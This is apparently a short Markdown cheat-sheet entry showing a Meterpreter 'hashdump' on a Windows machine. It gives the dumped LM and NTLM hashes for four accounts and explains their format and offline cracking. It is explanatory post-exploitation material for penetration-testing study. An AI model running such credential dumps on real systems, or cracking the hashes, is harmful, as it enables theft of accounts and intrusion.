### Hashdump

```bash
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
meterpreter > 
```

- Those lines from `hashdump` are **password hashes** extracted from the Windows.
    
    Format: `username:RID:LM_HASH:NTLM_HASH:::`.
    
- The `NTLM_HASH` values are what an attacker would target to recover plaintext passwords via offline cracking. Whether cracking succeeds depends on password strength and attacker resources.
- Possession of these hashes is **evidence of credential exposure** and a serious security breach.
